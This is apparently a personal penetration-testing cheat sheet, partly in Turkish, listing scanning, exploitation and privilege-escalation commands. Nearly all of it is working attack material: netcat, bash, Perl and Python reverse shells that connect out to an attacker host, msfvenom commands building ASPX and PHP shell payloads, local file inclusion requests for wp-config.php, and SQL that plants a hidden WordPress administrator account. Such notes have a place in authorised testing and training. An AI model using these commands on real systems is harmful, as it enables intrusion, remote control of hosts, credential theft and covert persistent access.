# Useful command

## Scan

### NMAP
```
nmap -A -Pn -n --top-ports 10000 -vvv -oN 192.168.27.68
```
### NIKTO
nikto -h 10.10.10.10:8000


## Get Shell & Listen:

### get shell

```
nc 192.168.56.1 4444 -e /bin/sh
```

the -e flag was not supported on the server’s implementation of netcat.:

```
mknod /tmp/backpipe p 
/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
```

### listen:
```
nc -nvlp 4444
```

***

## Exploitation

### LFI

oneExample:
GET /../../../../xampp\php\extras\browscap.ini
GET /../../../../xampp/htdocs/blog/wp-config.php


### DB

#### Connect MariaDB
mysql -u root 10.10.10.10 -p Password@1

SQL Query for Wordpress:
```
INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10');
```

### Unstage & Stage Shell

Unstage Shell: (karşılaması nc -nvlp)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp > aspunstage-52.aspx
```
Stage Shell: (karşılaması msfconsole handler)
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.52 LPORT=443 -f asp > aspstage_52.aspx
```

### Shell example

#### Reverse Shell Cheat Sheat

PHP Reverse Shell
```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -e php/base64 -f raw > shell.php
```
Karşılaması

```
msf> use exploit/multi/handler
set payload php/reverse_php
set lhost 10.10.10.10
exploit
```

##### BASH

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

##### PERL

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

##### PYTHON

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

##### NETCAT

nc -e /bin/sh 10.0.0.1 1234

##### PHP PentestMonkey

http://pentestmonkey.net/tools/web-shells/php-reverse-shell
```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

##### PHP Windows-reverse-shell
https://github.com/Dhayalanb/windows-php-reverse-shell

###### Upgrade Shell TTY

python -c 'import pty; pty.spawn("/bin/bash")'  

***

## PRIVILAGE ESCALATION

### C Compile

linux:
> gcc -o hello hello.c

windows 32 bit:
> i686-w64-mingw32-gcc -o hello.exe hello.c

windows 64 bit:
> x86_64-w64-mingw32 -o hello.exe hello.c

### File Transfer

Attacker machine

> python -m SimpleHTTPServer 8000

> python3 -m http.server 8000

